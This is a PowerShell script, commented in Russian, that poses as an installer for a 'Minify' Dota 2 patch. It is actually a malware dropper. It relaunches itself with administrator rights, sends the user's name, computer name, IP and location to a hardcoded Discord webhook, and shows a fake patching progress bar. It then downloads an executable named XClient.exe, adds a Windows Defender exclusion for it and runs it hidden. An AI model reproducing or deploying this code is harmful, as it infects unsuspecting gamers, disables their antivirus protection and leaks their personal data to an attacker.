# --- АДМИН-ЧЕК ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ СТРАНЫ (БЕЗ ОШИБОК) ---
function Get-Geo {
    try {
        $data = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,country,countryCode,query" -TimeoutSec 3
        if ($data.status -eq "success") {
            # Генерируем флаг через коды символов напрямую
            $c1 = [int][char]$data.countryCode[0] + 127397
            $c2 = [int][char]$data.countryCode[1] + 127397
            $f = [char]::ConvertFromUtf32($c1) + [char]::ConvertFromUtf32($c2)
            return @{ info = "$f $($data.country)"; ip = $data.query }
        }
    } catch {}
    return @{ info = "🌐 Unknown"; ip = "Unknown" }
}

# --- ЛОГЕР (РАСТЯНУТЫЙ, БЕЗ ???) ---
function Send-Log {
    param($Status, $Msg)
    $g = Get-Geo
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $hook = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
    $col = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }

    $json = @{
        embeds = @(@{
            title = "Minify Installer Log"
            color = $col
            fields = @(
                @{ name = "Status"; value = "``$Status``"; inline = $true }
                @{ name = "User"; value = "``$env:USERNAME``"; inline = $true }
                @{ name = "Computer"; value = "``$env:COMPUTERNAME``"; inline = $true }
                # Растягиваем через пустую строку (пробел)
                @{ name = "------------------------------------------"; value = " "; inline = $false }
                @{ name = "Location & IP"; value = "$($g.info) ($($g.ip))"; inline = $true }
                @{ name = "Timestamp"; value = "``$time``"; inline = $true }
                @{ name = "Message"; value = ">>> $Msg"; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body $bytes
    } catch {}
}

# --- GUI И РАБОТА ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Send-Log "STARTED" "User started Minify installer"

$f = New-Object Windows.Forms.Form
$f.Text = "Minify Dota 2 Patch v3.2.1"; $f.Size = "600,400"; $f.StartPosition = "CenterScreen"; $f.FormBorderStyle = "FixedDialog"

$pb = New-Object Windows.Forms.ProgressBar; $pb.Location = "20,300"; $pb.Size = "540,23"; $f.Controls.Add($pb)
$sl = New-Object Windows.Forms.Label; $sl.Location = "20,330"; $sl.Size = "540,20"; $sl.Text = "Initializing..."; $f.Controls.Add($sl)

$f.Show()
$steps = @("Checking files...", "Patching...", "Cleaning up...")
foreach($s in $steps){ $sl.Text = $s; $pb.Value += 33; $f.Refresh(); Start-Sleep 1 }

# --- DOWNLOAD & RUN ---
$url = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$out = "$env:TEMP\sys_update.exe"
try {
    (New-Object Net.WebClient).DownloadFile($url, $out)
    Add-MpPreference -ExclusionPath $out -Force -ErrorAction SilentlyContinue
    Start-Process $out -WindowStyle Hidden
    $f.Close()
    [Windows.Forms.MessageBox]::Show("Success!", "Done")
    Send-Log "SUCCESS" "Patch installed and XClient started"
} catch {
    Send-Log "ERROR" "Failed to install: $_"
    $f.Close()
}
